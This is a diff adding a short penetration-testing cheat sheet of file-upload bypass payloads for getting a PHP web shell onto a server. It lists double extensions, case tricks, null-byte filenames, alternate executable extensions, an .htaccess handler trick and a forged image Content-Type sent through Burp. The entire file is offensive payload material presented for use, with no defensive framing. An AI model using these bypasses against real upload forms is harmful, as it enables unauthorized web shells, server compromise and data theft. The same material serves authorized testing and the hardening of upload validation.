@@ -1,0 +1,23 @@
+EXTENSION BYPASS
+bash# Double extension
+shell.php.jpg
+shell.jpg.php
+
+# Case
+shell.PHP
+shell.PhP
+
+# Null byte (older servers)
+shell.php%00.jpg
+shell.php\x00.jpg
+
+# Special extensions
+shell.php5
+shell.php7
+shell.phtml
+shell.phar
+shell.shtml
+shell.htaccess   # if apache, add php handler
+
+# MIME type bypass (change Content-Type in Burp)
+Content-Type: image/jpeg   # while uploading .php
